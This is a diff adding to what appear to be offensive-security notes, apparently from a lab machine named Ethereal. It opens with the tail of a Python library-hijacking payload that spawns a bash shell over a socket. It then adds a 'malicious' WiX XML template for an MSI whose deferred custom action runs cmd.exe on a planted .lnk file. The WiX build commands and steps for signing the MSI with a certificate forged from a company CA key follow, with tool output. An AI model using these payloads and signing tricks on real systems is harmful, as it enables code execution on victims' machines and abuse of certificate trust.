@@ -100,4 +100,62 @@ Python Library Hijacking:
 		pty.spawn("/bin/bash")
 		s.close()
 
-	
+===========================================================================================================
+Malicious XML To Create MSI File:
+
+<?xml version="1.0"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+   <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" 
+
+            Name="Example Product Name" Version="0.0.1" Manufacturer="Example Company Name" Language="1033">
+      <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
+      <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
+
+      <Directory Id="TARGETDIR" Name="SourceDir">
+         <Directory Id="ProgramFilesFolder">
+            <Directory Id="INSTALLLOCATION" Name="Example">
+               <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
+               </Component>
+            </Directory>
+         </Directory>
+      </Directory>
+
+      <Feature Id="DefaultFeature" Level="1">
+         <ComponentRef Id="ApplicationFiles"/>
+      </Feature>
+
+<Property Id="cmdline">cmd.exe /c "C:\users\public\desktop\shortcuts\alha.lnk"</Property>
+<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
+Impersonate="yes"/>
+<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
+fail_here
+</CustomAction>
+<InstallExecuteSequence>
+<Custom Action="Stage1" After="InstallInitialize"></Custom>
+<Custom Action="Stage2" Before="InstallFiles"></Custom>
+</InstallExecuteSequence>
+
+   </Product>
+</Wix>
+
+======================================================================================================================
+Wix ToolSet Command:
+
+candle.exe -out C:\EtherealMSI\wixobj C:\EtherealMSI\msi.xml
+
+light.exe -out C:\EtherealMSI\myMsi.msi C:\EtherealMSI\wixobj
+======================================================================================================================
+Signning The MSI File With Certificate:
+
+C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin>makecert.exe -n "CN=Ethereal" -pe -cy end -ic C:\EtherealMSI\CompanyCA.cer -iv C:\EtherealMSI\CompanyCA.pvk -sky signature -sv C:\EtherealMSI\MyOwnCA.pvk C:\EtherealMSI\MyOwnCA.cer
+Succeeded
+
+C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin>pvk2pfx.exe -pvk C:\EtherealMSI\MyOwnCA.pvk -spc C:\EtherealMSI\MyOwnCA.cer -pfx C:\EtherealMSI\MyOwnCA.pfx
+
+C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin>signtool sign /f C:\EtherealMSI\MyOwnCA.pfx C:\EtherealMSI\myMsi.msi
+Done Adding Additional Store
+Successfully signed: C:\EtherealMSI\myMsi.msi
+
+C:\Program Files (x86)\Microsoft SDKs\Windows\v7.1A\Bin>signtool.exe verify /pa C:\EtherealMSI\myMsi.msi
+SignTool Error: WinVerifyTrust returned error: 0x800B010A
+        A certificate chain could not be built to a trusted root authority.
